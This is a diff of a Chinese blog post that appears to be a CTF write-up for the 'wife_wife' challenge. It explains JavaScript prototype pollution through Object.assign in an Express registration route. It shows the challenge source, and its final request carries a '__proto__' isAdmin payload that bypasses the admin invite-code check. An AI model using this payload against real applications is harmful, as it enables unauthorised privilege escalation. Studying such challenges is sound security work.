@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>关于页 | isum</title>
-  <meta name="keywords" content="">
-  <meta name="description" content="关于页 | isum">
+  <title>褥一把ctf系列之js原型链污染 | isum</title>
+  <meta name="keywords" content=" js原型链污染 ">
+  <meta name="description" content="褥一把ctf系列之js原型链污染 | isum">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="还没有">
 <meta property="og:type" content="website">
@@ -279,19 +279,34 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+        <article id="post-褥一把ctf系列之js原型链污染" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">关于页</h1>
+        <h1 class="article-title">褥一把ctf系列之js原型链污染</h1>
     
     <div class="article-meta">
         
         
         
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="刷题o比赛">刷题o比赛</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color3">js原型链污染</a>
+            
+        </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2024-05-29 22:00:20'>2024-04-27 07:27</time>
+            发布时间 : <time class="date" title='最后更新: 2024-06-04 09:13:35'>2024-05-30 09:04</time>
         
     </div>
     <div class="article-meta">
@@ -324,7 +339,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-text">知识点：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -340,7 +355,154 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>还没有</p>
+        <p>CATCTF——wife_wife(攻防世界)  总结</p>
+<hr>
+<p>页面巨可爱!</p>
+<p>需要以admin登录进去</p>
+<img src="/2024/05/30/%E8%A4%A5%E4%B8%80%E6%8A%8Actf%E7%B3%BB%E5%88%97%E4%B9%8Bjs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/1.png" class="" title="hexo插入图片的问题查了很多办法，最后只有一种办法成功显示了图片，但是这个办法却不能改变图片排版样式，网上有很多其他为了改变排版的办法，但是其实直接排好截图就好啦">
+
+<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><strong>一.———————-</strong></p>
+<p>1.node.js创建新用户的常见方法</p>
+<pre><code class="jsx">const express = require(&#39;express&#39;);  
+const mongoose = require(&#39;mongoose&#39;);  
+const bcrypt = require(&#39;bcrypt&#39;);  
+  
+// 连接MongoDB数据库  
+mongoose.connect(&#39;mongodb://localhost/mydatabase&#39;, &#123;  
+  useNewUrlParser: true,  
+  useUnifiedTopology: true,  
+&#125;)  
+.then(() =&gt; console.log(&#39;Connected to MongoDB...&#39;))  
+.catch(err =&gt; console.error(&#39;Could not connect to MongoDB...&#39;, err));  
+  
+// 定义用户模型  
+const UserSchema = new mongoose.Schema(&#123;  
+  username: &#123; type: String, required: true, unique: true &#125;,  
+  password: &#123; type: String, required: true &#125;,  
+&#125;);  
+  
+UserSchema.pre(&#39;save&#39;, function(next) &#123;  
+  const user = this;  
+  if (!user.isModified(&#39;password&#39;)) return next();  
+  bcrypt.genSalt(10, (err, salt) =&gt; &#123;  
+    if (err) return next(err);  
+    bcrypt.hash(user.password, salt, (err, hash) =&gt; &#123;  
+      if (err) return next(err);  
+      user.password = hash;  
+      next();  
+    &#125;);  
+  &#125;);  
+&#125;);  
+  
+const User = mongoose.model(&#39;User&#39;, UserSchema);  
+  
+const app = express();  
+app.use(express.json());  
+  
+app.post(&#39;/api/users&#39;, async (req, res) =&gt; &#123;  
+  const &#123; username, password &#125; = req.body;  
+  
+  // 验证用户名和密码（这里只是简单示例）  
+  if (!username || !password) &#123;  
+    return res.status(400).json(&#123; error: &#39;Username and password are required&#39; &#125;);  
+  &#125;  
+  
+  try &#123;  
+    const newUser = new User(&#123; username, password &#125;);  
+    await newUser.save();  
+    res.status(201).json(newUser);  
+  &#125; catch (err) &#123;  
+    res.status(500).json(&#123; error: &#39;Failed to create user&#39; &#125;);  
+  &#125;  
+&#125;);  
+  
+app.listen(3000, () =&gt; console.log(&#39;Server started on port 3000&#39;));
+</code></pre>
+<p>2.关于js的对象：可以说 “JavaScript 对象是变量的容器”，但是，我们通常认为 “JavaScript 对象是键值对的容器”</p>
+<p>json.parse() 将json数据解析为js对象</p>
+<p>(关于数据传输：body部分被 Express.js 的中间件body-parser解析为json数据)</p>
+<p>3.object.assign()：</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign">Object.assign() - JavaScript | MDN (mozilla.org)</a></p>
+<p>4.js原型链污染</p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E4%BD%BF%E7%94%A8%E4%B8%8D%E5%90%8C%E7%9A%84%E6%96%B9%E6%B3%95%E6%9D%A5%E5%88%9B%E5%BB%BA%E5%AF%B9%E8%B1%A1%E5%92%8C%E7%94%9F%E6%88%90%E5%8E%9F%E5%9E%8B%E9%93%BE">继承与原型链 - JavaScript | MDN (mozilla.org)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/361333.html">浅析CTF中的Node.js原型链污染 - FreeBuf网络安全行业门户</a></p>
+<pre><code class="jsx">//随便注册一个看看数据包
+POST /register HTTP/1.1
+Host: 61.147.171.105:49801
+Content-Length: 47
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://61.147.171.105:49801
+Referer: http://61.147.171.105:49801/register.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+&#123;&quot;username&quot;:&quot;b&quot;,&quot;password&quot;:&quot;b&quot;,&quot;isAdmin&quot;:false&#125;
+</code></pre>
+<pre><code class="jsx">//前端代码
+&lt;script&gt;
+        function register(username, password, inviteCode, isAdmin)&#123;
+            let user = &#123;username, password, isAdmin&#125;
+            if(isAdmin)&#123;
+                if(!inviteCode)&#123;
+                    alert(&#39;invite code required&#39;)
+                    return
+                &#125;
+                user = &#123;...user, inviteCode&#125;
+            &#125;
+            fetch(&#39;/register&#39;, &#123;
+                method: &#39;post&#39;,
+                body: JSON.stringify(user)
+            &#125;)
+            .then(res =&gt; res.json())
+            .then(res =&gt; &#123;
+                alert(res.msg)
+                if(!res.err)&#123;
+                    location.href = &#39;/login&#39;
+                &#125;
+            &#125;)
+        &#125;
+
+        function handle_isAdmin_change(isAdmin)&#123;
+            document.getElementById(&#39;div-invitecode&#39;).hidden = !isAdmin
+        &#125;
+    &lt;/script&gt;
+</code></pre>
+<pre><code class="jsx">//wp里部分后端源码
+app.post(&#39;/register&#39;, (req, res) =&gt; &#123;
+    let user = JSON.parse(req.body)
+    if (!user.username || !user.password) &#123;
+        return res.json(&#123; msg: &#39;empty username or password&#39;, err: true &#125;)
+    &#125;
+    if (users.filter(u =&gt; u.username == user.username).length) &#123;
+        return res.json(&#123; msg: &#39;username already exists&#39;, err: true &#125;)
+    &#125;
+    if (user.isAdmin &amp;&amp; user.inviteCode != INVITE_CODE) &#123;
+        user.isAdmin = false
+        return res.json(&#123; msg: &#39;invalid invite code&#39;, err: true &#125;)
+    &#125;
+    let newUser = Object.assign(&#123;&#125;, baseUser, user) //就是这里，原型链污染
+    users.push(newUser)
+    res.json(&#123; msg: &#39;user created successfully&#39;, err: false &#125;)
+&#125;)
+</code></pre>
+<pre><code class="jsx">//发包，注册成功
+POST /register HTTP/1.1
+Host: 61.147.171.105:49801
+Content-Length: 62
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://61.147.171.105:49801
+Referer: http://61.147.171.105:49801/register.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+
+&#123;&quot;username&quot;:&quot;e&quot;,&quot;password&quot;:&quot;e&quot;,&quot;__proto__&quot;:&#123;&quot;isAdmin&quot;:true&#125;&#125;
+</code></pre>
 
       
        <hr><span style="font-style: italic;color: gray;"> 梦里小镇落雨，开花，起风，挂霜，甚至扬起烤红薯的香气，每个墙角都能听见人们的说笑声。 </span>
